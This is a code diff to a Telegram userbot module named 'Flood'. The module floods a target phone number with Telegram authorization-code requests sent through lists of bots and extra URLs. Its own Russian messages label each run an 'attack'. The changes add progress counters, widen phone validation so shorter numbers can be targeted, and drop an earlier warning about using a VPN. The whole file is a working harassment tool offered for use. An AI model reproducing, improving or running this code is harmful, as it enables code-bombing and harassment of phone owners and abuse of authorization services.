@@ -35,6 +35,7 @@ async def _send_requests_with_logging(event, phone: str):
     completed = 0
 
     for bot_id, origin in bots:
+        completed += 1
         try:
             resp = await asyncio.to_thread(
                 requests.post,
@@ -55,15 +56,15 @@ async def _send_requests_with_logging(event, phone: str):
                 timeout=7
             )
             status = "OK" if resp.status_code == 200 else f"HTTP {resp.status_code}"
-            logger.info(f"Flood > Bot {logger.accent(bot_id)} via {origin} | {status}")
+            logger.info(f"[{completed}/{total_tasks}] Flood > Bot {logger.accent(bot_id)} via {origin} | {status}")
         except Exception as e:
-            logger.error(f"Flood > Bot {bot_id} Error: {e}")
+            logger.error(f"[{completed}/{total_tasks}] Flood > Bot {bot_id} Error: {e}")
         
-        completed += 1
         if completed % 3 == 0:
             await event.edit(f"**FLOOD🍀**\n\n🎯 Цель: `+{phone}`\n⏳ Прогресс: `{completed}/{total_tasks}`")
 
     for url in extra_urls:
+        completed += 1
         try:
             resp = await asyncio.to_thread(
                 requests.post,
@@ -73,18 +74,16 @@ async def _send_requests_with_logging(event, phone: str):
                 timeout=7
             )
             status = "OK" if resp.status_code == 200 else f"HTTP {resp.status_code}"
-            logger.info(f"Flood > Extra {logger.accent(url)} | {status}")
+            logger.info(f"[{completed}/{total_tasks}] Flood > Extra {logger.accent(url)} | {status}")
         except Exception as e:
-            logger.error(f"Flood > Extra Error {url}: {e}")
+            logger.error(f"[{completed}/{total_tasks}] Flood > Extra Error {url}: {e}")
             
-        completed += 1
         await event.edit(f"**FLOOD🍀**\n\n🎯 Цель: `+{phone}`\n⏳ Прогресс: `{completed}/{total_tasks}`")
 
     return completed
 
 
 async def _flood(event):
-    
     args = event.raw_text.strip().split(maxsplit=1)
     if len(args) < 2:
         await event.edit("**FLOOD🍀**\n\n❌ Использование: `.flood +71234567890`")
@@ -92,23 +91,22 @@ async def _flood(event):
 
     target = args[1].strip()
     phone = ''.join(filter(str.isdigit, target))
-    
-    if not phone or len(phone) < 10:
-        await event.edit("**FLOOD🍀**\n\n❌ Некорректный номер телефона")
+
+    if not phone or not (7 <= len(phone) <= 15):
+        await event.edit(f"**FLOOD🍀**\n\n❌ Некорректный номер: `{phone}`\nДолжно быть от 7 до 15 цифр.")
         return
 
     await event.edit(f"**FLOOD🍀**\n\n🎯 **Цель:** `+{phone}`\n🚀 **Статус:** `Запуск атаки...`")
     
     try:
         total_sent = await _send_requests_with_logging(event, phone)
-        
         await event.edit(
             f"**FLOOD 🍀**\n\n"
             f"🎯 **Цель:** `+{phone}`\n"
             f"✅ **Завершено!**\n"
-
+            f"📊 Отправлено запросов: `{total_sent}`"
         )
-        logger.success(f"Атака на {phone} завершена")
+        logger.success(f"Атака на {phone} полностью завершена. Всего: {total_sent}")
     except Exception as e:
         logger.error(f"Критическая ошибка в Flood: {e}")
         await event.edit(f"**FLOOD🍀**\n\n❌ Критическая ошибка: `{e}`")
@@ -117,12 +115,12 @@ async def _flood(event):
 def setup() -> BaseModule:
     return BaseModule(
         name="Flood",
-        version="1.0",
-        description="Флуд запросами авторизации Telegram (БЕЗ VPN НЕ ИСПОЛЬЗОВАТЬ)",
+        version="1.1",
+        description="Флуд запросами авторизации Telegram ",
         commands={
             "flood": _flood,
         },
         examples=[
-            "`.flood +71234567890` – начать флуд кодами"
+            "`.flood +номер` – теперь работает и на короткие номера"
         ],
     )
